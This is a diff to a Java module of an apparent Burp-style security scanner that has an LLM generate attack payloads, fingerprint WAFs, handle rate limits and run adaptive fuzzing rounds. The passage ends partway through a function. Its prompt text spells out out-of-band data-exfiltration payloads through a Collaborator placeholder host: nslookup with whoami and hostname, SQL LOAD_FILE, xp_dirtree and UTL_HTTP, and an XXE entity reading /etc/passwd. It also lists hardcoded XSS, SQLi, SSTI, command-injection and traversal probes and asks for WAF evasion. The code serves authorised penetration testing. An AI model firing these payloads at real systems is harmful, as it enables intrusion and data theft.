@@ -14,11 +14,15 @@ import com.omnistrike.framework.ModuleRegistry;
 
 import com.google.gson.*;
 
+import com.omnistrike.framework.SharedDataBus;
+
 import java.nio.charset.StandardCharsets;
 import java.util.*;
 import java.util.concurrent.*;
 import java.util.concurrent.atomic.AtomicInteger;
+import java.util.concurrent.atomic.AtomicLong;
 import java.util.concurrent.atomic.AtomicReference;
+import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 /**
@@ -83,6 +87,40 @@ public class AiVulnAnalyzer implements ScanModule {
 
     // Max payloads per LLM request: 0 = unlimited (AI decides), >0 = user-defined cap
     private volatile int maxPayloadsPerRequest = 0;
+
+    // SharedDataBus for tech stack context (Improvement 3)
+    private volatile SharedDataBus sharedDataBus;
+
+    // ==================== Improvement 1: WAF Fingerprinting ====================
+    // Per-host WAF fingerprint cache — reused across all parameters on the same host
+    private final ConcurrentHashMap<String, WafFingerprint> wafFingerprints = new ConcurrentHashMap<>();
+
+    // ==================== Improvement 4: Successful Payload Learning ====================
+    // Per-scan session context — accumulates confirmed findings for AI prompt enrichment
+    private final CopyOnWriteArrayList<ConfirmedFinding> sessionFindings = new CopyOnWriteArrayList<>();
+    private static final int MAX_SESSION_FINDINGS = 10;
+
+    // ==================== Improvement 6: Rate Limit Awareness ====================
+    // Per-host rate limit tracking
+    private final ConcurrentHashMap<String, RateLimitTracker> rateLimitTrackers = new ConcurrentHashMap<>();
+
+    // ==================== Improvement 7: Prompt Size Management ====================
+    // Token budget constants (approximate: 1 token ≈ 4 chars)
+    private static final int CONTEXT_TOKEN_BUDGET = 8000;
+    private static final int CONTEXT_CHAR_BUDGET = CONTEXT_TOKEN_BUDGET * 4; // ~32K chars
+    private static final int RESPONSE_BODY_TRUNCATE = 500; // bytes for adaptive results
+
+    // ==================== Improvement 9: Structured Output Enforcement ====================
+    private static final int MAX_JSON_RETRIES = 1;
+
+    // ==================== Improvement 10: Cost Tracking ====================
+    private final AtomicLong totalInputTokens = new AtomicLong(0);
+    private final AtomicLong totalOutputTokens = new AtomicLong(0);
+    private final AtomicInteger totalApiCalls = new AtomicInteger(0);
+    private volatile double estimatedCostUsd = 0.0;
+
+    // ==================== Improvement 11: Multi-Step Exploitation ====================
+    private static final int MAX_EXPLOIT_ROUNDS = 5;
 
     // Static file extensions to skip
     private static final Set<String> SKIP_EXTENSIONS = Set.of(
@@ -430,13 +468,22 @@ public class AiVulnAnalyzer implements ScanModule {
         if (serverAddr == null || serverAddr.isEmpty()) {
             return "";
         }
+        // Improvement 5: Collaborator-aware payload chaining with data exfiltration
         return "OUT-OF-BAND (OOB) TESTING: You have access to a Burp Collaborator server at: " + serverAddr + "\n"
                 + "For any blind/OOB payloads (blind SQLi, blind XXE, blind SSRF, blind command injection, etc.), "
                 + "use the literal placeholder {COLLAB} wherever you need a unique Collaborator subdomain.\n"
                 + "Example: For blind XXE, use <!ENTITY xxe SYSTEM \"http://{COLLAB}\">\n"
                 + "Example: For blind SSRF, use http://{COLLAB}/test\n"
                 + "Example: For blind SQLi DNS exfil, use LOAD_FILE('\\\\\\\\{COLLAB}\\\\a')\n"
-                + "The {COLLAB} placeholder will be automatically replaced with a real tracked Collaborator URL.\n\n";
+                + "The {COLLAB} placeholder will be automatically replaced with a real tracked Collaborator URL.\n\n"
+                + "DATA EXFILTRATION via Collaborator:\n"
+                + "When generating OOB/blind payloads, embed data exfiltration in the Collaborator subdomain:\n"
+                + "- Command Injection: nslookup $(whoami).{COLLAB} or nslookup $(cat /etc/hostname | base32 | tr -d =).{COLLAB}\n"
+                + "- SQL OOB (MySQL): SELECT LOAD_FILE(CONCAT('\\\\\\\\\\\\\\\\',version(),'.{COLLAB}\\\\\\\\a'))\n"
+                + "- SQL OOB (MSSQL): exec master..xp_dirtree '\\\\\\\\' + db_name() + '.{COLLAB}\\\\a'\n"
+                + "- SQL OOB (Oracle): SELECT UTL_HTTP.REQUEST('http://'||user||'.{COLLAB}') FROM DUAL\n"
+                + "- XXE OOB: <!ENTITY % exfil SYSTEM 'http://{COLLAB}/?data=file:///etc/passwd'>\n"
+                + "This turns binary OOB confirmation into data extraction. The exfiltrated data appears as a subdomain in the Collaborator interaction.\n\n";
     }
 
     private static String getAttackType(String moduleId) {
@@ -612,13 +659,35 @@ public class AiVulnAnalyzer implements ScanModule {
         if (cancelled) return;
         queuedCount.set(getQueueSize());
         try {
-            String prompt = buildAnalysisPrompt(targetModuleId) + exchange.toPromptText();
+            // Build enriched prompt with tech stack context (Improvement 3)
+            StringBuilder promptBuilder = new StringBuilder(buildAnalysisPrompt(targetModuleId));
+
+            // Improvement 3: Tech stack context
+            String techContext = buildTechStackContext(reqResp);
+            if (!techContext.isEmpty()) promptBuilder.append(techContext);
+
+            // Improvement 4: Session findings context
+            String sessionContext = buildSessionFindingsContext();
+            if (!sessionContext.isEmpty()) promptBuilder.append(sessionContext);
+
+            // Improvement 7: Trim exchange text to fit budget
+            String exchangeText = exchange.toPromptText();
+            int remaining = CONTEXT_CHAR_BUDGET - promptBuilder.length();
+            if (exchangeText.length() > remaining && remaining > 1000) {
+                exchangeText = trimToTokenBudget(exchangeText, remaining);
+            }
+            promptBuilder.append(exchangeText);
+
+            String prompt = promptBuilder.toString();
+            trackInputTokens(prompt);
             logInfo(">>> Sending passive analysis request to " + llmClient.getProvider().getDisplayName()
                     + " (model: " + llmClient.getModel() + ") for " + exchange.getUrl()
                     + " | prompt size: " + prompt.length() + " chars"
                     + (targetModuleId != null ? " | module: " + targetModuleId : ""));
             long startMs = System.currentTimeMillis();
-            String rawResponse = llmClient.call(prompt);
+
+            // Improvement 9: Structured output enforcement with retry
+            String rawResponse = callWithRetry(prompt);
             long elapsedMs = System.currentTimeMillis() - startMs;
             logInfo("<<< AI response received in " + elapsedMs + "ms | response size: "
                     + (rawResponse != null ? rawResponse.length() : 0) + " chars");
@@ -690,6 +759,27 @@ public class AiVulnAnalyzer implements ScanModule {
             logInfo("Smart Fuzzing: Requesting payloads for " + exchange.getUrl()
                     + (targetParameter != null ? " [param: " + targetParameter + "]" : ""));
 
+            // Improvement 6: Rate limit check before starting
+            if (!waitForRateLimit(exchange.getUrl())) return;
+
+            // Improvement 1: WAF fingerprinting before fuzzing
+            String wafContext = "";
+            if (targetParameter != null && !targetParameter.isEmpty()) {
+                String injPoint = "query"; // default
+                WafFingerprint fp = getOrBuildWafFingerprint(originalReqResp.request(),
+                        targetParameter, injPoint);
+                wafContext = fp.toPromptText();
+            }
+
+            // Improvement 3: Technology stack context
+            String techContext = buildTechStackContext(originalReqResp);
+
+            // Improvement 4: Session findings context
+            String sessionContext = buildSessionFindingsContext();
+
+            // Improvement 8: Static scanner dedup
+            String dedupContext = buildStaticScannerDedup(exchange.getUrl(), targetModuleId);
+
             // Step 1: Ask LLM for targeted payloads
             String paramConstraint = "";
             if (targetParameter != null) {
@@ -697,12 +787,34 @@ public class AiVulnAnalyzer implements ScanModule {
                         + "'. Do not generate payloads for other parameters. "
                         + "Every payload MUST have \"parameter\": \"" + targetParameter + "\".\n\n";
             }
-            String prompt = buildFuzzPrompt(targetModuleId) + paramConstraint + exchange.toPromptText();
+
+            // Build enriched prompt with all context
+            String basePrompt = buildFuzzPrompt(targetModuleId);
+            StringBuilder enrichedPrompt = new StringBuilder(basePrompt);
+            if (!wafContext.isEmpty()) enrichedPrompt.append(wafContext);
+            if (!techContext.isEmpty()) enrichedPrompt.append(techContext);
+            if (!sessionContext.isEmpty()) enrichedPrompt.append(sessionContext);
+            if (!dedupContext.isEmpty()) enrichedPrompt.append(dedupContext);
+            enrichedPrompt.append(paramConstraint);
+
+            // Improvement 7: Trim the exchange text to fit token budget
+            String exchangeText = exchange.toPromptText();
+            int remaining = CONTEXT_CHAR_BUDGET - enrichedPrompt.length();
+            if (exchangeText.length() > remaining && remaining > 1000) {
+                exchangeText = trimToTokenBudget(exchangeText, remaining);
+            }
+            enrichedPrompt.append(exchangeText);
+
+            String prompt = enrichedPrompt.toString();
+            trackInputTokens(prompt);
             logInfo(">>> Sending fuzz request to " + llmClient.getProvider().getDisplayName()
                     + " (model: " + llmClient.getModel() + ") | prompt size: " + prompt.length() + " chars"
+                    + " | est. cost: " + getCostSummary()
                     + (targetModuleId != null ? " | module: " + targetModuleId : ""));
             long startMs = System.currentTimeMillis();
-            String rawResponse = llmClient.call(prompt);
+
+            // Improvement 9: Structured output enforcement with retry
+            String rawResponse = callWithRetry(prompt);
             long elapsedMs = System.currentTimeMillis() - startMs;
             logInfo("<<< AI fuzz response received in " + elapsedMs + "ms | response size: "
                     + (rawResponse != null ? rawResponse.length() : 0) + " chars");
@@ -748,6 +860,13 @@ public class AiVulnAnalyzer implements ScanModule {
             List<FuzzResult> allResults = new ArrayList<>();
             for (FuzzPayload payload : payloads) {
                 if (cancelled) { logInfo("Smart Fuzzing: Cancelled mid-scan."); return; }
+
+                // Improvement 6: Rate limit check before each request
+                if (!waitForRateLimit(exchange.getUrl())) {
+                    logInfo("Smart Fuzzing: Halted due to rate limiting/IP block.");
+                    break;
+                }
+
                 try {
                     // AtomicReference lets the OOB callback access the response after sendRequest
                     AtomicReference<HttpRequestResponse> reqRespRef = new AtomicReference<>();
@@ -759,6 +878,9 @@ public class AiVulnAnalyzer implements ScanModule {
                     long elapsed = System.currentTimeMillis() - startTime;
                     reqRespRef.set(response); // Now OOB callback can read the request/response
                     fuzzRequestsSent.incrementAndGet();
+
+                    // Improvement 6: Track response for rate limiting
+                    trackRateLimit(exchange.getUrl(), response);
 
                     boolean wafDetected = isWafBlocked(response);
                     FuzzResult result = new FuzzResult(resolvedPayload, response, wafDetected, elapsed);
@@ -780,15 +902,52 @@ public class AiVulnAnalyzer implements ScanModule {
                 }
             }
 
-            // Step 4: Adaptive scanning — continues until the AI returns no more payloads
+            // Step 4: Adaptive scanning — Improvement 2: max 5 rounds, stop after 3 with no progress
             if (adaptiveScan && !allResults.isEmpty() && !cancelled) {
                 int round = 1;
-                while (!cancelled) {
+                int roundsWithNoProgress = 0;
+                int previousFindingsCount = findingsCount.get();
+                final int maxAdaptiveRounds = 5;
+                final int noProgressThreshold = 3;
+
+                while (!cancelled && round <= maxAdaptiveRounds) {
+                    // Improvement 6: Rate limit check before each round
+                    if (!waitForRateLimit(exchange.getUrl())) break;
+
                     List<FuzzResult> adaptiveResults = performAdaptiveRound(
                             originalReqResp.request(), allResults, round, targetModuleId);
                     if (adaptiveResults.isEmpty()) break;
                     allResults.addAll(adaptiveResults);
+
+                    // Check if this round produced new findings
+                    int currentFindings = findingsCount.get();
+                    if (currentFindings == previousFindingsCount) {
+                        roundsWithNoProgress++;
+                        if (roundsWithNoProgress >= noProgressThreshold) {
+                            logInfo("Adaptive Scan: Stopping — no progress after " + roundsWithNoProgress
+                                    + " rounds. Reporting WAF fingerprint if applicable.");
+                            // Report WAF fingerprint as INFO finding if WAF was detected
+                            String host = extractHost(exchange.getUrl());
+                            WafFingerprint fp = wafFingerprints.get(host);
+                            if (fp != null && fp.wafDetected) {
+                                findingsStore.addFinding(Finding.builder("ai-vuln-analyzer",
+                                                "WAF Fingerprint — All Payloads Blocked", Severity.INFO, Confidence.FIRM)
+                                        .url(exchange.getUrl())
+                                        .evidence(fp.toPromptText())
+                                        .description("[AI Adaptive] WAF blocked all payloads after " + round
+                                                + " adaptive rounds. " + fp.blockedProbes.size() + " probe types blocked.")
+                                        .build());
+                            }
+                            break;
+                        }
+                    } else {
+                        roundsWithNoProgress = 0;
+                        previousFindingsCount = currentFindings;
+                    }
                     round++;
+                }
+                if (round > maxAdaptiveRounds) {
+                    logInfo("Adaptive Scan: Reached max rounds (" + maxAdaptiveRounds + ")");
                 }
             }
 
@@ -886,9 +1045,21 @@ public class AiVulnAnalyzer implements ScanModule {
             logInfo("Adaptive Scan: Round " + round + " — analyzing " + previousResults.size() + " previous results");
 
             String resultsSummary = formatResultsForLlm(previousResults);
-            String prompt = String.format(ADAPTIVE_PROMPT, resultsSummary);
 
-            String rawResponse = llmClient.call(prompt);
+            // Improvement 6: Include rate limit context if we've been throttled
+            String host = extractHost(originalRequest.url());
+            RateLimitTracker tracker = rateLimitTrackers.get(host);
+            String rateLimitNote = "";
+            if (tracker != null && tracker.consecutive429s > 0) {
+                rateLimitNote = "\nNOTE: Target is rate-limiting. Generate fewer, higher-quality payloads — "
+                        + "maximum 5 per round instead of 20. Current delay: " + tracker.currentDelayMs + "ms.\n";
+            }
+
+            String prompt = String.format(ADAPTIVE_PROMPT, resultsSummary) + rateLimitNote;
+            trackInputTokens(prompt);
+
+            // Improvement 9: Structured output enforcement
+            String rawResponse = callWithRetry(prompt);
             List<FuzzPayload> payloads = parseFuzzPayloads(rawResponse);
 
             // Filter off-target payloads in adaptive rounds too
@@ -906,6 +1077,9 @@ public class AiVulnAnalyzer implements ScanModule {
 
             for (FuzzPayload payload : payloads) {
                 if (cancelled) break;
+                // Improvement 6: Rate limit check
+                if (!waitForRateLimit(originalRequest.url())) break;
+
                 try {
                     AtomicReference<HttpRequestResponse> reqRespRef = new AtomicReference<>();
                     FuzzPayload resolved = resolveCollaboratorPlaceholders(payload, originalRequest.url(), reqRespRef, targetModuleId);
@@ -915,6 +1089,7 @@ public class AiVulnAnalyzer implements ScanModule {
                     long elapsed = System.currentTimeMillis() - startTime;
                     reqRespRef.set(response);
                     fuzzRequestsSent.incrementAndGet();
+                    trackRateLimit(originalRequest.url(), response);
 
                     boolean wafDetected = isWafBlocked(response);
                     FuzzResult result = new FuzzResult(resolved, response, wafDetected, elapsed);
@@ -1135,6 +1310,12 @@ public class AiVulnAnalyzer implements ScanModule {
 
         findingsStore.addFinding(finding);
         findingsCount.incrementAndGet();
+
+        // Improvement 4: Record confirmed finding in session context for future prompts
+        if (severity == Severity.HIGH || severity == Severity.CRITICAL) {
+            recordConfirmedFinding(result.payload.attackType, result.payload.parameter,
+                    url, result.payload.payload, evidence);
+        }
     }
 
     // ==================== Collaborator Integration ====================
@@ -1255,6 +1436,385 @@ public class AiVulnAnalyzer implements ScanModule {
         return false;
     }
 
+    // ==================== WAF Fingerprinting (Improvement 1) ====================
+
+    private static final String[] WAF_PROBE_PAYLOADS = {
+            "<script>alert(1)</script>",
+            "' OR 1=1-- -",
+            "{{7*7}}",
+            "; cat /etc/passwd",
+            "../../../../etc/passwd"
+    };
+    private static final String[] WAF_PROBE_LABELS = {
+            "XSS <script>", "SQLi OR", "SSTI {{7*7}}", "CMDi cat", "Path traversal"
+    };
+    private static final List<String> WAF_INDICATOR_HEADERS = List.of(
+            "X-WAF-Action", "X-CDN", "CF-RAY", "X-Sucuri-ID", "X-Amz-Cf-Id",
+            "X-Akamai-Session", "Server"
+    );
+
+    /**
+     * Probes the target parameter with 5 known-bad payloads to build a WAF fingerprint.
+     * Cached per host — returns existing fingerprint if available.
+     */
+    private WafFingerprint getOrBuildWafFingerprint(HttpRequest originalRequest, String parameterName,
+                                                      String injectionPoint) {
+        String host = extractHost(originalRequest.url());
+        WafFingerprint cached = wafFingerprints.get(host);
+        if (cached != null && (System.currentTimeMillis() - cached.createdAt) < 300_000) { // 5 min TTL
+            logInfo("WAF Fingerprint: Using cached fingerprint for " + host);
+            return cached;
+        }
+
+        logInfo("WAF Fingerprint: Probing " + host + " with " + WAF_PROBE_PAYLOADS.length + " probes...");
+        WafFingerprint fp = new WafFingerprint();
+
+        for (int i = 0; i < WAF_PROBE_PAYLOADS.length; i++) {
+            if (cancelled) break;
+            try {
+                FuzzPayload probe = new FuzzPayload(
+                        parameterName, injectionPoint, WAF_PROBE_PAYLOADS[i], "probe", WAF_PROBE_LABELS[i]);
+                HttpRequest modified = injectPayload(originalRequest, probe);
+                HttpRequestResponse response = api.http().sendRequest(modified);
+                fuzzRequestsSent.incrementAndGet();
+
+                if (response.response() != null) {
+                    int status = response.response().statusCode();
+                    boolean blocked = isWafBlocked(response);
+
+                    if (blocked) {
+                        fp.blockedProbes.add(WAF_PROBE_LABELS[i]);
+                        fp.wafDetected = true;
+                        fp.blockStatus = status;
+                        String body = response.response().bodyToString();
+                        if (body != null && fp.blockBodyPattern.isEmpty()) {
+                            // Extract first meaningful line of the block page
+                            String trimmed = body.replaceAll("<[^>]+>", " ").trim();
+                            fp.blockBodyPattern = truncate(trimmed, 100);
+                        }
+                        // Collect WAF-specific headers
+                        for (var h : response.response().headers()) {
+                            for (String wafHeader : WAF_INDICATOR_HEADERS) {
+                                if (h.name().equalsIgnoreCase(wafHeader)) {
+                                    fp.blockHeaders.add(h.name() + ": " + h.value());
+                                }
+                            }
+                        }
+                    } else {
+                        fp.passedProbes.add(WAF_PROBE_LABELS[i]);
+                    }
+                }
+            } catch (Exception e) {
+                logError("WAF Fingerprint: Probe " + WAF_PROBE_LABELS[i] + " failed: " + e.getMessage());
+            }
+        }
+
+        wafFingerprints.put(host, fp);
+        logInfo("WAF Fingerprint: " + host + " — waf=" + fp.wafDetected
+                + " passed=" + fp.passedProbes.size() + " blocked=" + fp.blockedProbes.size());
+        return fp;
+    }
+
+    // ==================== Technology Stack Context (Improvement 3) ====================
+
+    /**
+     * Collects technology stack information from HTTP response headers and SharedDataBus.
+     * Returns a text block to include in AI prompts.
+     */
+    private String buildTechStackContext(HttpRequestResponse reqResp) {
+        StringBuilder tech = new StringBuilder();
+        List<String> detectedTech = new ArrayList<>();
+
+        if (reqResp != null && reqResp.response() != null) {
+            for (var h : reqResp.response().headers()) {
+                String name = h.name().toLowerCase();
+                if ("server".equals(name)) detectedTech.add("Server: " + h.value());
+                if ("x-powered-by".equals(name)) detectedTech.add("Framework: " + h.value());
+                if ("x-aspnet-version".equals(name)) detectedTech.add("ASP.NET: " + h.value());
+                if ("x-generator".equals(name)) detectedTech.add("Generator: " + h.value());
+                // CDN/WAF indicators
+                if ("cf-ray".equals(name)) detectedTech.add("CDN: Cloudflare");
+                if ("x-amz-cf-id".equals(name)) detectedTech.add("CDN: CloudFront");
+                if ("x-sucuri-id".equals(name)) detectedTech.add("WAF: Sucuri");
+                if ("x-akamai-session".equals(name)) detectedTech.add("CDN: Akamai");
+            }
+        }
+
+        // Pull technology findings from SharedDataBus if available
+        if (sharedDataBus != null) {
+            // Framework detections published by other scanners
+            Set<String> frameworks = sharedDataBus.getSet("detected-frameworks");
+            for (String fw : frameworks) detectedTech.add("Detected: " + fw);
+
+            Set<String> databases = sharedDataBus.getSet("detected-databases");
+            for (String db : databases) detectedTech.add("Database: " + db);
+
+            Set<String> templateEngines = sharedDataBus.getSet("detected-templates");
+            for (String te : templateEngines) detectedTech.add("Template engine: " + te);
+        }
+
+        // Pull from FindingsStore — look for existing findings that reveal technology
+        if (findingsStore != null) {
+            for (Finding f : findingsStore.getAllFindings()) {
+                String title = f.getTitle().toLowerCase();
+                if (title.contains("mysql")) detectedTech.add("Database: MySQL (from scan)");
+                else if (title.contains("postgresql")) detectedTech.add("Database: PostgreSQL (from scan)");
+                else if (title.contains("mssql") || title.contains("sql server"))
+                    detectedTech.add("Database: MSSQL (from scan)");
+                else if (title.contains("jinja2")) detectedTech.add("Template: Jinja2 (from scan)");
+                else if (title.contains("angularjs")) detectedTech.add("Frontend: AngularJS (from scan)");
+                if (detectedTech.size() > 15) break; // Cap to avoid bloating prompt
+            }
+        }
+
+        // Deduplicate
+        LinkedHashSet<String> unique = new LinkedHashSet<>(detectedTech);
+        if (!unique.isEmpty()) {
+            tech.append("TARGET TECHNOLOGY STACK:\n");
+            for (String t : unique) tech.append("  - ").append(t).append("\n");
+            tech.append("Use this information to generate technology-specific payloads.\n\n");
+        }
+        return tech.toString();
+    }
+
+    // ==================== Successful Payload Learning (Improvement 4) ====================
+
+    /**
+     * Records a confirmed finding in the scan session context.
+     * Used to enrich future AI prompts with prior confirmed findings.
+     */
+    private void recordConfirmedFinding(String vulnType, String parameter, String url,
+                                          String payload, String evidence) {
+        ConfirmedFinding cf = new ConfirmedFinding(vulnType, parameter, url, payload, evidence,
+                System.currentTimeMillis());
+        sessionFindings.add(cf);
+        // Keep only the last MAX_SESSION_FINDINGS
+        while (sessionFindings.size() > MAX_SESSION_FINDINGS) {
+            sessionFindings.remove(0);
+        }
+    }
+
+    /**
+     * Builds a prompt section listing previously confirmed findings for this scan session.
+     */
+    private String buildSessionFindingsContext() {
+        if (sessionFindings.isEmpty()) return "";
+        StringBuilder sb = new StringBuilder();
+        sb.append("PREVIOUSLY CONFIRMED VULNERABILITIES ON THIS APPLICATION:\n");
+        for (ConfirmedFinding cf : sessionFindings) {
+            sb.append("  - ").append(cf.toPromptText()).append("\n");
+        }
+        sb.append("Prioritize similar vulnerability types and technology-specific payloads.\n\n");
+        return sb.toString();
+    }
+
+    // ==================== Rate Limit Awareness (Improvement 6) ====================
+
+    /**
+     * Checks if we should pause before sending a request to this host.
+     * Applies backoff if rate-limited. Returns false if IP is blocked.
+     */
+    private boolean waitForRateLimit(String url) {
+        String host = extractHost(url);
+        RateLimitTracker tracker = rateLimitTrackers.computeIfAbsent(host, k -> new RateLimitTracker());
+
+        if (tracker.ipBlocked) {
+            logInfo("Rate Limit: IP blocked for " + host + " — halting AI scan");
+            findingsStore.addFinding(Finding.builder("ai-vuln-analyzer",
+                            "AI Scan Halted — Target Blocking Detected", Severity.INFO, Confidence.FIRM)
+                    .url(url)
+                    .evidence("Target " + host + " appears to have blocked our IP after "
+                            + fuzzRequestsSent.get() + " requests (5+ consecutive identical block responses).")
+                    .description("[AI Rate Limit] Scan halted to avoid further blocking.")
+                    .build());
+            return false;
+        }
+
+        if (tracker.shouldPause()) {
+            long waitMs = tracker.pauseUntil - System.currentTimeMillis();
+            if (waitMs > 0) {
+                logInfo("Rate Limit: Pausing " + waitMs + "ms for " + host);
+                try { Thread.sleep(Math.min(waitMs, 120_000)); } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                    return false;
+                }
+            }
+        }
+        return true;
+    }
+
+    /**
+     * Records the response for rate limit tracking.
+     */
+    private void trackRateLimit(String url, HttpRequestResponse response) {
+        if (response == null || response.response() == null) return;
+        String host = extractHost(url);
+        RateLimitTracker tracker = rateLimitTrackers.computeIfAbsent(host, k -> new RateLimitTracker());
+
+        int status = response.response().statusCode();
+        String body = response.response().bodyToString();
+        String bodyHash = body != null ? String.valueOf(body.hashCode()) : "";
+
+        tracker.recordResponse(status, bodyHash);
+
+        if (status == 429) {
+            String retryAfter = null;
+            for (var h : response.response().headers()) {
+                if ("retry-after".equalsIgnoreCase(h.name())) {
+                    retryAfter = h.value();
+                    break;
+                }
+            }
+            tracker.applyBackoff(retryAfter);
+            logInfo("Rate Limit: 429 received from " + host + " (consecutive: " + tracker.consecutive429s
+                    + ", delay: " + tracker.currentDelayMs + "ms)");
+        }
+    }
+
+    // ==================== Prompt Size Management (Improvement 7) ====================
+
+    /**
+     * Trims prompt context to fit within the token budget.
+     * Strips boilerplate, truncates bodies, summarizes if needed.
+     */
+    private String trimToTokenBudget(String context, int charBudget) {
+        if (context.length() <= charBudget) return context;
+
+        // Step 1: Strip CSS blocks
+        context = context.replaceAll("<style[^>]*>[\\s\\S]*?</style>", "[CSS removed]");
+        if (context.length() <= charBudget) return context;
+
+        // Step 2: Strip inline JS boilerplate (but keep src/urls)
+        context = context.replaceAll("<script[^>]*>[\\s\\S]*?</script>", "[JS block removed]");
+        if (context.length() <= charBudget) return context;
+
+        // Step 3: Strip HTML tags (keep text content)
+        context = context.replaceAll("<[^>]+>", " ");
+        if (context.length() <= charBudget) return context;
+
+        // Step 4: Collapse whitespace
+        context = context.replaceAll("\\s+", " ");
+        if (context.length() <= charBudget) return context;
+
+        // Step 5: Hard truncate
+        return context.substring(0, charBudget) + "\n[... truncated to fit token budget]";
+    }
+
+    /**
+     * Strips boilerplate from an HTTP response body for inclusion in prompts.
+     */
+    private String stripResponseBoilerplate(String body, int maxLen) {
+        if (body == null) return "";
+        // Remove CSS and large JS blocks
+        body = body.replaceAll("<style[^>]*>[\\s\\S]*?</style>", "");
+        body = body.replaceAll("<script[^>]*>[\\s\\S]*?</script>", "");
+        body = body.replaceAll("\\s+", " ");
+        return truncate(body, maxLen);
+    }
+
+    // ==================== Structured Output Enforcement (Improvement 9) ====================
+
+    /**
+     * Calls the LLM with retry on malformed JSON. If the first response can't be parsed,
+     * retries once with a stricter prompt before falling back to the raw response.
+     */
+    private String callWithRetry(String prompt) throws LlmException {
+        String rawResponse = llmClient.call(prompt);
+        trackTokenUsage(rawResponse);
+
+        // Try to parse — if it works, return as-is
+        String json = extractJson(rawResponse);
+        if (json != null) {
+            try {
+                JsonParser.parseString(json);
+                return rawResponse; // Valid JSON
+            } catch (JsonSyntaxException ignored) {}
+        }
+
+        // Malformed JSON — retry with stricter instructions
+        logInfo("Structured Output: First response had malformed JSON, retrying with stricter prompt...");
+        String retryPrompt = prompt + "\n\nCRITICAL: Your previous response was not valid JSON. "
+                + "You MUST respond with ONLY a JSON object. No markdown, no explanation, no code fences. "
+                + "Start your response with { and end with }. Ensure all strings are properly escaped.";
+        rawResponse = llmClient.call(retryPrompt);
+        trackTokenUsage(rawResponse);
+        return rawResponse;
+    }
+
+    // ==================== Cost Tracking (Improvement 10) ====================
+
+    /**
+     * Extracts token usage from the raw LLM response (if available in response metadata)
+     * and updates running totals. For API backends, token counts come from response headers/body.
+     */
+    private void trackTokenUsage(String rawResponse) {
+        totalApiCalls.incrementAndGet();
+        // Estimate tokens from character count (rough: 1 token ≈ 4 chars)
+        if (rawResponse != null) {
+            long outputTokensEst = rawResponse.length() / 4;
+            totalOutputTokens.addAndGet(outputTokensEst);
+        }
+        updateEstimatedCost();
+    }
+
+    /**
+     * Tracks input token usage (estimated from prompt size).
+     */
+    private void trackInputTokens(String prompt) {
+        if (prompt != null) {
+            long inputTokensEst = prompt.length() / 4;
+            totalInputTokens.addAndGet(inputTokensEst);
+        }
+    }
+
+    private void updateEstimatedCost() {
+        // Default pricing: Anthropic Claude Sonnet-level pricing as baseline
+        // Input: $3/1M tokens, Output: $15/1M tokens
+        double inputCost = (totalInputTokens.get() / 1_000_000.0) * 3.0;
+        double outputCost = (totalOutputTokens.get() / 1_000_000.0) * 15.0;
+        estimatedCostUsd = inputCost + outputCost;
+    }
+
+    // ==================== Payload Deduplication (Improvement 8) ====================
+
+    /**
+     * Builds a prompt section listing which payload categories the static scanner already tested.
+     * Reads from FindingsStore to see which scan modules have already run against this target.
+     */
+    private String buildStaticScannerDedup(String url, String targetModuleId) {
+        if (findingsStore == null || targetModuleId == null) return "";
+
+        List<String> testedCategories = new ArrayList<>();
+        String host = extractHost(url);
+
+        // Check which modules have reported findings or scanned this host
+        if (moduleRegistry != null) {
+            for (ScanModule module : moduleRegistry.getAllModules()) {
+                if ("ai-vuln-analyzer".equals(module.getId())) continue;
+                // Check if this module's findings exist for this host
+                String moduleId = module.getId();
+                boolean hasFindings = false;
+                for (Finding f : findingsStore.getAllFindings()) {
+                    if (moduleId.equals(f.getModuleId()) && f.getUrl() != null
+                            && extractHost(f.getUrl()).equals(host)) {
+                        hasFindings = true;
+                        break;
+                    }
+                }
+                if (hasFindings) {
+                    testedCategories.add(module.getName());
+                }
+            }
+        }
+
+        if (testedCategories.isEmpty()) return "";
+
+        return "STATIC SCANNER CONTEXT: The following scanner modules have already tested this target: "
+                + String.join(", ", testedCategories) + ". "
+                + "Focus on novel evasion techniques and creative payloads the static scanners do not cover. "
+                + "Avoid basic/obvious payloads that a rule-based scanner would already have sent.\n\n";
+    }
+
     // ==================== LLM Response Parsing ====================
 
     private List<FuzzPayload> parseFuzzPayloads(String rawResponse) {
@@ -1311,23 +1871,58 @@ public class AiVulnAnalyzer implements ScanModule {
         return bypasses;
     }
 
+    /**
+     * Formats fuzz results for the LLM adaptive prompt (Improvement 2: Response-aware).
+     * Includes full HTTP response details: status, headers, and body (truncated).
+     * Applies prompt size management (Improvement 7) to keep within budget.
+     */
     private String formatResultsForLlm(List<FuzzResult> results) {
         StringBuilder sb = new StringBuilder();
         int i = 1;
+        int charBudget = CONTEXT_CHAR_BUDGET;
+
         for (FuzzResult r : results) {
-            sb.append("--- Test ").append(i++).append(" ---\n");
-            sb.append("Parameter: ").append(r.payload.parameter)
+            StringBuilder entry = new StringBuilder();
+            entry.append("--- Test ").append(i++).append(" ---\n");
+            entry.append("Parameter: ").append(r.payload.parameter)
                     .append(" (").append(r.payload.injectionPoint).append(")\n");
-            sb.append("Attack: ").append(r.payload.attackType).append("\n");
-            sb.append("Payload: ").append(truncate(r.payload.payload, 500)).append("\n");
-            sb.append("Response Time: ").append(r.responseTimeMs).append("ms\n");
-            sb.append("WAF Blocked: ").append(r.wafDetected).append("\n");
+            entry.append("Attack: ").append(r.payload.attackType).append("\n");
+            entry.append("Payload: ").append(truncate(r.payload.payload, 300)).append("\n");
+            entry.append("Response Time: ").append(r.responseTimeMs).append("ms\n");
+            entry.append("WAF Blocked: ").append(r.wafDetected).append("\n");
+
+            // Improvement 2: Include full response details for adaptive rounds
             if (r.response != null && r.response.response() != null) {
-                sb.append("Status: ").append(r.response.response().statusCode()).append("\n");
+                entry.append("Status: ").append(r.response.response().statusCode()).append("\n");
+
+                // Include key response headers
+                entry.append("Response Headers: ");
+                List<String> interestingHeaders = new ArrayList<>();
+                for (var h : r.response.response().headers()) {
+                    String name = h.name().toLowerCase();
+                    if (name.equals("content-type") || name.equals("server") || name.equals("x-powered-by")
+                            || name.equals("location") || name.equals("set-cookie")
+                            || name.startsWith("x-waf") || name.startsWith("x-cdn")
+                            || name.equals("cf-ray") || name.equals("www-authenticate")) {
+                        interestingHeaders.add(h.name() + ": " + h.value());
+                    }
+                }
+                entry.append(interestingHeaders.isEmpty() ? "(none relevant)" : String.join(" | ", interestingHeaders));
+                entry.append("\n");
+
+                // Include response body (stripped of boilerplate, Improvement 7)
